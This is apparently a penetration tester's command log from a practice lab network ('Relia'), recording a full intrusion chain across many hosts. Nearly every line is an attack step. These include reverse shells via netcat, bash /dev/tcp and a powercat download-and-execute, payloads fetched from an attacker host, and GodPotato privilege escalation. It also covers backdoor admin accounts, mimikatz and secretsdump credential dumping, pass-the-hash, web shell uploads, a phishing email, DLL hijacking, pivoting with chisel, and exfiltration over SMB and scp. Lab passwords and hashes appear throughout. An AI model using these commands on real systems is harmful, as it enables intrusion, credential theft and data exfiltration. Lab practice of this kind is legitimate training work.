	powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <psencode-here-4444> --> at http://192.168.178.248/cmdasp.aspx
	whoami /priv
	iwr -uri http://192.168.45.213:8082/GodPotato.exe -OutFile GodPotato.exe
	.\GodPotato.exe -cmd "powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <psencoded-command-5555>"
	[access is gaine as NT authority]
	net user /add added_user Password1# 
	net localgroup administrators added_user /add
	net localgroup "Remote Desktop Users" added_user /add
	xfreerdp /v:192.168.178.248 /u:added_user /p:Password1#
	[graphical RDP access is gained as added_user (an Administrator)]
	iwr -uri http://192.168.45.213:8082/mimikatz.exe -OutFile mimikatz.exe
	.\mimikatz.exe
		privilege::debug
		log
		sekurlsa::logonpasswords
	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winPEASx64.exe
	.\winPEASx64.exe log=WINPEAS_SYSTEM_248.txt
	
impacket-secretsdump Administrator@192.168.178.248 -hashes ":56e4633688c0fdd57c610faf9d7ab8df"

sudo masscan -p1-65535,U:1-65535 192.168.228.222 --rate=1000 -e tun0

sudo nmap -sV -sC -p 14020,14080 192.168.178.247

ftp -p 192.168.178.247 14020
	- get umbraco.pdf

searchsploit umbraco 7
searchsploit -m aspx/webapps/49488.py
python3 49488.py -u mark@relia.com -p OathDeeplyReprieve91 -i http://web02.relia.com:14080 -c whoami

git clone https://github.com/crypticsilence/umbraco-pseudoshell.git
	change:
		login = "mark@relia.com";
		password="OathDeeplyReprieve91";
		host = "http://web02.relia.com:14080";
python2 umps.py
On 192.168.247.247:
	powershell.exe -ep bypass -w hidden -NoP -EncodedCommand <psencoded-revshell-4444>
	whoami /priv
	iwr -uri http://192.168.45.213:8082/GodPotato.exe -OutFile GodPotato.exe
	.\GodPotato.exe -cmd "psencoded-revshell-5555"
	[access is gained as SYSTEM]
	Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue
	net user added_user Password1# /add
	net localgroup administrators added_user /add
	net localgroup "Remote Desktop Users" added_user /add
	xfreerdp /v:192.168.247.247 /u:added_user /p:"Password1#"
	[graphical administrative access is gained as added_user]
	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winPEASx64.exe
	iwr -uri http://192.168.45.213:8082/mimikatz.exe -OutFile mimikatz.exe
	.\winPEASx64.exe log=WINPEAS_SYSTEM_247.txt
	.\mimikatz.exe
		token::elevate
		privilege::debug
		sekurlsa::logonpasswords
	[output from post-exploitation is exfiltrated over ftp]
	netstat -ano | findstr 127.0.0.1
	ssh -N -R 127.0.0.1:9999:127.0.0.1:14147 kali@192.168.45.213

impacket-secretsdump Administrator@192.168.247.247 -hashes ":2f2b8d5d4d756a2c72c554580f970c14" | tee 247_files/secretsDumpHashes.txt

feroxbuster -u http://192.168.247.249:8000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,400
feroxbuster -u http://192.168.247.249:8000/cms -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 404,400
	login admin : admin at http://192.168.247.249:8000/cms/admin.php
searchsploit rite cms
searchsploit -m php/webapps/50616.txt
	[logged in as admin : admin] > Files Manager > Upload file > simple-backdoor.php as simple-backdoor.pHP > http://192.168.247.249:8000/cms/media/backdoor.pHP?cmd=whoami
	http://192.168.247.249:8000/cms/media/backdoor.pHP?cmd=powershell.exe%20-ep%20bypass%20-w%20hidden%20-NoP%20-EncodedCommand%20<psencoded-revshell>

On 192.168.247.249
	[access is gained as legacy\adrian]
	whoami /priv
	cd C:\Users\Public\Documents
	iwr -uri http://192.168.45.213:8082/GodPotato.exe -OutFile GodPotato.exe
	iwr -uri http://192.168.45.213:8082/nc64.exe -OutFile nc64.exe
	.\GodPotato.exe -cmd "nc64.exe -e cmd.exe 192.168.45.213 8887"
	[access is gained as SYSTEM]
	net user /add added_user Password1#
	net localgroup administrators added_user /add
	net localgroup "Remote Desktop Users" added_user /add
	xfreerdp /v:192.168.247.249 /u:added_user /p:"Password1#"
	[graphical administrative access is gained as added_user]
	iwr -uri http://192.168.45.213:8082/mimikatz.exe -OutFile mimikatz.exe
	.\mimikatz.exe
		privilege::debug
		token::elevate
		log
		sekurlsa::logonpasswords
		sudo impacket-smbserver -user test -pass test -smb2support share .		--> on attacker
	iwr -uri http://192.168.45.213:8082/winpeas.bat -OutFile winpeas.bat
	.\winpeas.bat >> WINPEAS_BAT_ADMIN_249.txt
	net use \\192.168.45.213\share /u:test test	
	copy mimikatz.log \\192.168.45.213\share\
	copy WINPEAS_ADMIN_PASSWORDS_249.txt \\192.168.45.213\share\
	scp -r C:\staging\.git kali@192.168.45.213:/home/kali/ChallengeLabs/Relia/249_files/gitRepository/
		impacket-secretsdump Administrator@192.168.247.249 -hashes ":387aef0561b65e4f3cae0960b0fba2d5"
		crackmapexec smb 192.168.247.249 -u Administrator -H 387aef0561b65e4f3cae0960b0fba2d5 -x 'net localgroup "Remote Desktop Users" damon /add'
		crackmapexec smb 192.168.247.249 -u Administrator -H 387aef0561b65e4f3cae0960b0fba2d5 -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
	xfreerdp /v:192.168.247.249 /u:damon /pth:"820d6348890893116880101307197052"
	[graphical access is gained as the damon user]
	cd C:\staging
	git log
	git show 8b430c17c16e6c0515e49c4eafdd129f719fde74		--> this shows jim@relia.com, webdmz@relia.com, and phishing intel

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
swaks --to jim@relia.com --from maildmz@relia.com --auth-user maildmz@relia.com --header "Subject: Changes to the git repository" --body "Please review this recent change to the git repository at C:\\staging on 192.168.247.249" --server 192.168.247.189 --attach @/home/kali/webdav/config.Library-ms --suppress-data -ap
	- powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213:8082/powercat.ps1');powercat -c 192.168.45.213 -p 4444 -e powershell"

On 172.16.207.14
	[access is gained as relia\jim via phishing]
	net domain /user
	iwr -uri http://192.168.45.213:8082/chisel.exe -OutFile chisel.exe
		chisel server --port 8085 --reverse
	.\chisel client 192.168.45.213:8085 R:socks
	[WK01 is now used as a pivot point into the internal network]
	iwr -uri http://192.168.45.213:8082/PowerUp.ps1 -OutFile PowerUp.ps1
	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winpeas.exe
	.\winpeas.exe log=WINPEAS_JIM_14.txt
	iwr -uri http://192.168.45.213:8082/SharpHound.ps1 -OutFile SharpHound.ps1
	. .\SharpHound.ps1
	Invoke-BloodHound -CollectionMethod All -OutputDirectory .\ -OutputPrefix "INGESTION_14"
		sudo neo4j start
		bloodhound
		MATCH (m:User) RETURN m 		--> andrea has first degree group membership in INTRANETRDP
	type C:\Users\jim\Pictures\exec.ps1
	net use \\192.168.45.213\share /u:test test
	copy C:\Users\jim\Documents\Database.kdbx \\192.168.45.213\share
		keepass2john Database.kdbx >> hash.keepass
		hashcat -m 13400 hash.keepass /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule		--> recovered password as mercedes1
		keepass2 Database.kdbx

xfreerdp /v:192.168.235.191 /u:dmzadmin /p:"SlimGodhoodMope"
	[graphical access is gained to .191 as dmzadmin]
	[proof.txt is collected]


proxychains -q crackmapexec smb internal.txt -u anonymous -p "" --shares
proxychains -q crackmapexec smb 172.16.207.14 -u maildmz -p DPuBT9tGCBrTbR
proxychains -q crackmapexec smb internal.txt  -u maildmz -p DPuBT9tGCBrTbR --shares
	proxychains -q smbmap -H 172.16.207.21 -u maildmz -p DPuBT9tGCBrTbR -d relia
proxychains -q smbclient \\\\172.16.207.21\\apps -U relia.com\\maildmz
proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.207.6 relia.com/maildmz:"DPuBT9tGCBrTbR"
proxychains -q impacket-GetNPUsers relia.com/ -dc-ip 172.16.207.6 -format hashcat -usersfile domain/domain_users.txt
proxychains -q crackmapexec smb 172.16.207.6 -u maildmz -p DPuBT9tGCBrTbR --groups >> domain/domain_groups.txt
proxychains -q crackmapexec smb 172.16.207.6 -u maildmz -p DPuBT9tGCBrTbR --users

sudo hashcat -m 18200 michelle.asrep /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

proxychains -q crackmapexec smb internal.txt -u michelle -p "NotMyPassword0k?"
proxychains -q crackmapexec smb internal.txt -u michelle -p "NotMyPassword0k?" --shares
proxychains -q crackmapexec smb internal.txt -u jim -p "Castello1\!"

proxychains -q xfreerdp /v:172.16.195.7 /u:michelle /p:"NotMyPassword0k?"
	[graphical access is gained to INTRANET as michelle]
	iwr -uri http://192.168.45.213:8082/PowerUp.ps1 -OutFile PowerUp.ps1
	. .\PowerUp.ps1
	Invoke-AllChecks
	iwr -uri http://192.168.45.213:8082/winPEASx64.exe -OutFile winpeas.exe
	.\winpeas.exe log=WINPEAS_MICHELLE_7.txt
	Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State-like 'Running'}
	icacls C:\Scheduler\scheduler.exe
	icacls C:\Scheduler\
		[scheduler.exe is transferred to WINPREP and analyzed with Procmon64.exe for missing DLLs]
		[grab malicious dll code from https://github.com/ezra-fast/OSCPPrep/blob/master/Windows/malicious_dll_2.cpp]
		[insert psencoded reverse shell]
		x86_64-w64-mingw32-gcc beyondhelper.c --shared -o beyondhelper.dll
	net use \\192.168.45.213\share
	copy \\192.168.45.213\share\beyondhelper.dll C:\Scheduler\beyondhelper.dll
	sc stop Scheduler
	sc start Scheduler
	[local Adminstrative access is gained on INTRANET]
	net user /add added_user Password1#
	net localgroup administrators added_user /add
	net localgroup "Remote Desktop Users" added_user /add
	net localgroup "Remote Management Users" added_user /add
	proxychains -q xfreerdp /v:172.16.210.7 /u:added_user /p:"Password1#"
	[graphical administrative access is gained to .7 as added_user]
	[secrets are dumped with mimikatz]
		hashcat -m 1000 7_files/crack.ntlm /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
		proxychains -q impacket-secretsdump Administrator@172.16.210.7 -hashes ":8b4547a5116dd13e6e206d1286a06b28"

proxychains -q xfreerdp /v:172.16.210.15 /u:andrea /p:"PasswordPassword_6"
	[access is gained to .15 (WK01) as andrea]
	[psencoded-revshell is added to C:\schedule.ps1]
	[access to .15 is gained as milana]
	[milana local admin is used to create a new administrative user]
	[graphical admin access is gained to .15]
	[mimikatz is used to dump credentials]
	[secretsdump is used to dump credentials as milana]
	[winpeas discovers C:\Users\milana\Documents\Database.kdbx]
		keepass2john Database.kdbx >> hash.keepass 
		hashcat -m 13400 hash.keepass /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule		--> destiny1 is the password
		keepass2 Database.kdbx
		[sarahs private SSH key is recovered]

chmod 0600 sarah_id.key
proxychains -q ssh -i sarah_id.key sarah@172.16.210.19
	[access is gained to .19 via SSH as sarah]
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	ls -al /etc/cron.d
	sudo -l
	find / -name *backup* 2>/dev/null
	ls -al /opt/
	[usb.img is copied to kali]
		sudo mount -o loop usb.img /mnt/
	wget -O pspy64 http://192.168.45.213:8082/pspy64
	./pspy64
	sudo /usr/bin/borg list borgbackup/
	sudo /usr/bin/borg extract --stdout borgbackup::home
	[amy password is cracked via crackstation.net]
	su - amy
	sudo su -
	[access is gained as root]
	/home/sarah/linpeas.sh | tee LINPEAS_ROOT_19.txt

proxychains -q ssh  andrew@172.16.146.20
	[ssh access is gained to .20 as andrew]
	[linpeas is downloaded and executed]
	find / -type f -perm -u=s 2>/dev/null
	find / -name doas.conf 2>/dev/null
	doas -u root service apache24 onestart
	sockstat -4 -l
	ssh -N -R 127.0.0.1:9000:127.0.0.1:80 kali@192.168.45.213
	find / -wholename */www/* 2>/dev/null | head -n 25
	wget -O /usr/local/www/apache24/data/phpMyAdmin/tmp/backdoor.php http://192.168.45.213:8083/simple-backdoor.php
	browse to "http://localhost:9000/phpMyAdmin/tmp/backdoor.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.213%2F7777%200%3E%261%27"
	[reverse shell access is gained as www, who is in the wheel group]
	/usr/local/bin/wget -O linpeas.sh http://192.168.45.213:8082/linpeas.sh
	./linpeas.sh | tee LINPEAS_WWW_20.txt
		/usr/local/bin/curl http://192.168.45.213:8082/linpeas.sh | sh | tee LINPEAS_WWW_20.txt
	cat /usr/local/etc/doas.conf			--> permit nopass :wheel
	/usr/local/bin/doas -u root su -
	[access is gained to .20 as root via doas]
	/usr/local/bin/curl http://192.168.45.213:8082/linpeas.sh | sh | tee LINPEAS_WWW_20.txt
	cat /home/mountuser/.history

proxychains -q crackmapexec smb internal.txt -u mountuser -p "DRtajyCwcbWvH/9" --shares
proxychains -q smbclient \\\\172.16.146.21\\scripts -U relia.com\\mountuser
proxychains -q smbclient \\\\172.16.146.21\\monitoring -U relia.com\\mountuser
	recurse ON
	prompt OFF
	mget *
	[all files from both monitoring and scripts are retrieved as mountuser, who has read access]
	grep -r "assw" .						--> reveals that ./PowerShell_transcript.FILES.9_DjDa0f.20221019132304.txt contains a plaintext password for relia.com\\Administrator on line 20

proxychains -q crackmapexec smb internal.txt -u Administrator -p "vau\!XCKjNQBv2$"
proxychains -q nxc rdp internal.txt -u Administrator -p "vau\!XCKjNQBv2$"

proxychains -q nxc smb 172.16.146.6 -u Administrator -p "vau\!XCKjNQBv2$" -x "<psencoded-reverse-shell>"
	[on each of the remaining machines]
	powershell.exe -Command 'Get-ChildItem -Path C:\ -Include local.txt,proof.txt -File -Recurse -ErrorAction SilentlyContinue'

crackmapexec smb 192.168.186.189 -u Administrator -p "vau\!XCKjNQBv2$"
impacket-smbexec relia.com/Administrator:"vau\!XCKjNQBv2$"@192.168.186.189
proxychains -q nxc smb 172.16.146.6 -u Administrator -p "vau\!XCKjNQBv2$" -x "<psencoded-reverse-shell>"
	cmd.exe /c where /R C:\ proof.txt
	cmd.exe /c where /R C:\ local.txt



```
